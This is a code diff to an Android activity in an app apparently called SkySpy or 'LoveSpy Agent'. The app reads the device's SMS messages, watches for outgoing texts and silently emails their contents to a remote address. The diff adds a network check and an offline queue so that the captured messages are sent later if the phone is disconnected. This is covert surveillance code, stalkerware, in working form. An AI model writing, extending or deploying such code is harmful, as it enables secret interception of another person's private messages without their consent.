@@ -8,14 +8,20 @@ import android.os.Handler;
 import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
+import android.widget.ArrayAdapter;
+import android.widget.ListView;
 import android.widget.TextView;
 import android.widget.Toast;
 
 import com.example.skyspy.app.R;
 import com.example.skyspy.app.email.EmailSending;
+import com.example.skyspy.app.network.NetworkUpdateReceiver;
 import com.example.skyspy.app.sms.SmsReader;
 import com.example.skyspy.app.sms.SmsSentObserver;
+import com.example.skyspy.app.network.NetworkStatus;
 import com.example.skyspy.app.utils.Utils;
+
+import java.util.ArrayList;
 
 public class SmsActivity extends Activity{
 
@@ -23,17 +29,20 @@ public class SmsActivity extends Activity{
     private String mLetter;
     private SmsSentObserver mSmsSentObserver;
     private static final Uri STATUS_URI = Uri.parse("content://sms");
+    private ArrayList<String> mSuspendedLetterList = new ArrayList<String>();
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        TextView textView = new TextView(this);
+        setContentView(R.layout.sms_list);
         SmsReader smsReader = new SmsReader(this);
         mLetter = smsReader.getSmsList();
-        textView.setText(mLetter);
-        setContentView(textView);
         mSmsSentObserver = new SmsSentObserver(new Handler(), this);
         getContentResolver().registerContentObserver(STATUS_URI, true, mSmsSentObserver);
+        ListView listView = (ListView) findViewById(R.id.listView);
+        String[] items = {mLetter};
+        ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, items);
+        listView.setAdapter(adapter);
     }
 
     @Override
@@ -67,18 +76,18 @@ public class SmsActivity extends Activity{
         mEmailSending.setTo(toArr);
         mEmailSending.setFrom("wooo@wooo.com");
         mEmailSending.setSubject("[Sms] LoveSpy Agent");
-        mEmailSending.setBody(mLetter);
         try {
-            //mEmailSending.addAttachment("/sdcard/filelocation");
-            if(mEmailSending.sendSilently()) {
-                //Toast.makeText(this, "Email was sent successfully.", Toast.LENGTH_LONG).show();
-                runToastOnUiThread("Email was sent successfully.", Toast.LENGTH_LONG);
+            if (NetworkStatus.getInstance(this).isOnline()) {
+                if (mEmailSending.sendSilently(mLetter)) {
+                    runToastOnUiThread("Email was sent successfully.", Toast.LENGTH_LONG);
+                } else {
+                    runToastOnUiThread("Email was not sent.", Toast.LENGTH_LONG);
+                }
             } else {
-                //Toast.makeText(this, "Email was not sent.", Toast.LENGTH_LONG).show();
-                runToastOnUiThread("Email was not sent.", Toast.LENGTH_LONG);
+                mSuspendedLetterList.add(mLetter);
+                NetworkUpdateReceiver.setLetterList(mSuspendedLetterList);
             }
         } catch(Exception e) {
-            //Toast.makeText(MailApp.this, "There was a problem sending the email.", Toast.LENGTH_LONG).show();
             Log.e(Utils.TAG, "Could not send email", e);
         }
     }
